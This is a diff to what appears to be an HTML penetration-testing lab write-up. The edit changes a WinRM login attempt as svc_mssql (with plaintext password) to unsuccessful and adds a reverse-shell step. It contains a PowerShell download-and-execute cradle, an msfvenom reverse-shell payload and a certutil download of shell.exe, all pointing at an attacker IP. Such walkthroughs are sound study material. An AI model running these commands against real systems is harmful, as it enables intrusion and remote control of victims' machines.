@@ -86,18 +86,21 @@ iex(new-object net.webclient).downloadString('http://192.168.45.152:80/Invoke-Ke
   </section>
 
   <section>
-    <h2>WinRM Access as svc_mssql</h2>
-    <p>Using the recovered credentials to authenticate via WinRM. Initial attempts fail on default ports, but port 47001 is available.</p>
+    <h2>Attempted WinRM Access as svc_mssql</h2>
+    <p>Using the recovered credentials to authenticate via WinRM.</p>
     <div class="code-block">
       <pre>nxc winrm 192.168.120.187 --port 47001 -u 'svc_mssql' -p 'trustno1'</pre>
     </div>
     <img src="../images/Pasted image 20250707194008.png" alt="">
-    <p>Successfully gain shell access as the <code>svc_mssql</code> user.</p>
+    <p>Unsuccessful WinRM shell access as the <code>svc_mssql</code> user.</p>
   </section>
 
   <section>
     <h2>RunAsCs Reverse Shell</h2>
     <p>Prepare a reverse shell executable and transfer it to the target.</p>
+    <div class="code-block">
+      <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=445 -f exe > shell.exe</pre>
+    </div>
     <div class="code-block">
       <pre>certutil -urlcache -split -f http://192.168.45.152/shell.exe</pre>
     </div>
